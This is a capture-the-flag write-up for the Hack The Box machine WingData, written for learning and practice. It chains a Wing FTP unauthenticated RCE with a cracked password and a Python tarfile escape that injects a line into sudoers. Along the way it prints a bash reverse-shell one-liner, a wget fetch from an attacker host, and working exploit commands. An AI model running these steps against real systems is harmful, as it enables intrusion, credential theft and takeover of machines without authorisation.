# HTB WingData — Writeup

**Difficulty:** Easy  
**OS:** Linux  
**IP:** 10.129.53.152  
**Tools:** nmap, ffuf, searchsploit, hashcat/john, sshpass, python3

---

## Attack Chain

```
Nmap → vhost discovery → Wing FTP CVE-2025-47812 RCE (wingftp)
→ credential extraction from XML config → hash crack → SSH as wacky (user flag)
→ sudo misconfiguration + CVE-2025-4517 tarfile abuse → root
```

---

## 1. Reconnaissance

### Port Scan

```bash
nmap --privileged -sSCV -oN nmap -T4 10.129.53.152
```

```
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7
80/tcp open  http    Apache httpd 2.4.66
                     → redirects to http://wingdata.htb/
```

Add to `/etc/hosts`:

```bash
echo "10.129.53.152 wingdata.htb" | sudo tee -a /etc/hosts
```

### VHost Enumeration

```bash
ffuf -c -u 'http://wingdata.htb' -H 'Host: FUZZ.wingdata.htb' \
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -t 25 -fw 21 -s
```

Result: `ftp.wingdata.htb`

```bash
echo "10.129.53.152 ftp.wingdata.htb" | sudo tee -a /etc/hosts
```

Navigating to `http://ftp.wingdata.htb` reveals a **Wing FTP Server v7.4.3** login page.

---

## 2. Foothold — CVE-2025-47812 (Unauthenticated RCE)

Wing FTP Server ≤ 7.4.3 is vulnerable to unauthenticated RCE via Lua injection (EDB-52347).

**How it works:**  
A POST to `/loginok.html` with a username containing a NULL byte (`%00`) followed by Lua code causes the C authentication function to truncate at the NULL byte (seeing only `anonymous`, which is allowed), while the session file is written with the full unsanitized string. When `/dir.html` is accessed with the resulting session cookie, the server executes the embedded Lua payload via `io.popen()`.

```bash
# Grab the exploit
searchsploit -m 52347

# Test RCE
python3 52347.py -u http://ftp.wingdata.htb -c 'id'
# uid=1000(wingftp) gid=1000(wingftp)

# Reverse shell
nc -lvnp 9999 &
python3 52347.py -u http://ftp.wingdata.htb \
    -c 'bash -c "bash -i >& /dev/tcp/<YOUR_IP>/9999 0>&1"'
```

Upgrade shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 3. Lateral Movement — Credential Extraction & Hash Cracking

Wing FTP stores user credentials in XML files under `/opt/wftpserver/Data/`.

```bash
cat /opt/wftpserver/Data/1/users/wacky.xml
```

Relevant field:

```xml
<UserName>wacky</UserName>
<Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
```

The `settings.xml` confirms password salting is enabled — the salt is appended to the hash as `hash:SALT`.

### Crack with Hashcat (mode 1410 — sha256:salt)

```bash
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > wacky_password.txt
hashcat -m 1410 wacky_password.txt /usr/share/wordlists/rockyou.txt
```

Recovered password: `!#7Blushing^*Bride5`

### SSH as wacky

```bash
sshpass -p '!#7Blushing^*Bride5' ssh -o StrictHostKeyChecking=no wacky@10.129.53.152
cat ~/user.txt
```

---

## 4. Privilege Escalation — CVE-2025-4517 (tarfile PATH_MAX Bypass)

### Sudo Enumeration

```bash
sudo -l
```

```
(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

The script extracts `.tar` archives from `/opt/backup_clients/backups/` into a staging directory using:

```python
with tarfile.open(backup_path, "r") as tar:
    tar.extractall(path=staging_dir, filter="data")
```

This runs as **root**. Despite the `filter="data"` parameter, CVE-2025-4517 abuses Python's tarfile PATH_MAX handling to escape the extraction directory via a crafted symlink/hardlink chain, allowing writes to arbitrary paths (e.g., `/etc/sudoers`).

### Exploit

```bash
# On attacker machine
git clone https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData.git
python3 -m http.server 80

# On target (as wacky)
cd /tmp
wget http://<YOUR_IP>/CVE-2025-4517-POC.py
python3 /tmp/CVE-2025-4517-POC.py
```

The PoC:
1. Builds a malicious tar archive with a symlink chain that escapes the staging directory
2. Creates a hardlink targeting `/etc/sudoers`
3. Injects `wacky ALL=(ALL) NOPASSWD: ALL`
4. Places the archive as `backup_9999.tar` in `/opt/backup_clients/backups/`
5. Triggers the restore script via sudo

After the script runs:

```bash
sudo /bin/bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

---

## Summary

| Step | Technique | CVE |
|------|-----------|-----|
| Foothold | Wing FTP Lua injection → unauthenticated RCE | CVE-2025-47812 |
| Lateral movement | Credential extraction from XML + hash cracking | — |
| Privilege escalation | tarfile PATH_MAX bypass → sudoers injection | CVE-2025-4517 |
